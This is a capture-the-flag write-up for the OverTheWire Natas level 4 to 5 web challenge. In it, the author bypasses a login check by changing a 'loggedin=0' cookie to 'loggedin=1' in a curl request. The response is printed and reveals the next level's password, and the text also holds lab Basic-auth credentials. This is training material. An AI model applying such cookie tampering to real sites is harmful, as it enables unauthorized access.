# Level 4-5

LINK : http://natas5.natas.labs.overthewire.org/

![](Screenshot from 2018-12-16 11-40-01.png)



This has to do with cookies

```bash
curl 'http://natas5.natas.labs.overthewire.org/' -H 'Connection: keep-alive' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' -H 'Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' -H 'Cookie: __cfduid=db3dcdb049e929c04c7586b0959a8901e1544885701; __utmc=176859643; __utmz=176859643.1544885699.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utma=176859643.1354877644.1544885699.1544900570.1544937978.3; __utmt=1; loggedin=0; __utmb=176859643.10.10.1544937978' --compressed
```



I see a cookie `loggedin=0`

Let's replace it 



```bash
curl 'http://natas5.natas.labs.overthewire.org/' -H 'Connection: keep-alive' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' -H 'Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' -H 'Cookie: __cfduid=db3dcdb049e929c04c7586b0959a8901e1544885701; __utmc=176859643; __utmz=176859643.1544885699.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utma=176859643.1354877644.1544885699.1544900570.1544937978.3; __utmt=1; loggedin=1; __utmb=176859643.10.10.1544937978' --compressed
```



```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas5", "pass": "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq" };</script></head>
<body>
<h1>natas5</h1>
<div id="content">
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>
</body>
</html>

```

YaY